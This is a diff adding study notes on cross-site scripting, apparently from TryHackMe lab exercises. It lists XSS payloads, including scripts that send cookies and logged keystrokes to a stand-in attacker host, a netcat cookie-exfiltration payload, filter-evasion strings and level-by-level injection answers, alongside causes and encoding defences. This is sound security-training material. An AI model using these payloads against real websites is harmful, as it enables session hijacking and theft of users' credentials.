@@ -1,0 +1,83 @@
+PoC> <script>alert('XSS');</script>
+
+<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+
+<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+
+imagine a JavaScript function for changing the user's email address called user.changeEmail()
+
+payload: <script>user.changeEmail('attacker@hacker.thm');</script>
+
+Reflected XSS - Social Engineering
+
+Stored XSS - similar to blind XSS
+
+DOM Based XSS - look in code afte window.location.x parameters
+
+eval()
+Blind XSS> XSS Hunter Express
+
+XSS Exercise
+Enter your name form>
+L1> Alex 		-> <h2>Hello, Alex</h2> 							-> <script>alert('XSS');</script>
+L2> Alex 		-> <h2>Hello, <input value="Alex"></h2> 					-> "><script>alert('XSS');</script>
+L3> Alex 		-> <h2>Hello, <textarea>Alex</textarea></h2> 					-> </textarea><scrip>alert('XSS');</script>
+L4> Alex 		-> <h2>Hello, <span class="name">Alex</span></h2>...<script>			-> ';alert('XSS');//
+				document.getElementByClassName('name')[0].innerHTML='Alex';</script>
+L5> Alex 		-> <h2>Hello, Alex</h2>...<script>// IGNORE...</script>				-> <script>alert('XSS');<script> 		-> Hello, <>alert('XSS');</> -> <sscriptcript>alert('XSS');</sscriptcript>
+L6> /images/cat.jpg 	-> <h2>Your Picture</h2><img src="/images/cat.jpg">...				-> "><script>alert('XSS');</script>		-> <img src=""scriptalert('XSS');/script"> -> /images/cat.jpg" onload="alert('THM');
+
+
+<textarea>Comment</textarea> -> payload: </textarea><script>fetch('http://IP_Attacker:PORT_NetCat?cookie=' + btoa(document.cookie) );</script>
+
+Developer Tools:
+alert(1)
+console.log(1)
+btoa(1) = MQ==
+atob("MQ==") = 1
+
+DOM - Document Object Model
+
+Causes:
+>insufficient input sanitization and validation
+>lack of output encoding (minim for html: <,>,",' and &; minim for JavaScript: '," and \)
+>improper use of security headers (CSP - unsafe-inline or unsafe-eval)
+>frmawork and language vulnerabilities
+>third-parties libraries
+
+implications:
+>Session Hijacking - steal cookies and impersonate a user
+>phishing and credential theft - fake login prompt
+>social engineering
+>Content manipulation and defecement
+>data exfiltration
+>malware installation
+
+Reflected XSS:
+
+http://shop.thm/search.php?q=table
+http://shop.thm/search.php?q=<script>alert(document.cookie)</script> (&lt;script&gt;alert('XSS')&lt;/script&gt;)
+
+PHP 		- htmlspecialchars()
+Python		- from html import escape
+JavaScript	- sanitizeHTML(), escapeHTML()
+ASP.NET	(C#)	- HttpUtility.HtmlEncode()
+
+XSS Payload List
+Tiny XSS List
+XSS Filter Evasion Cheat Sheet
+
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+
+
+<iframe src="javascript:alert(`xss`)">
+
+Then add a comment and see if you can insert some of your own HTML.
+<a>You have been Hacked!</a>
+
+
+Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.
+
+<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
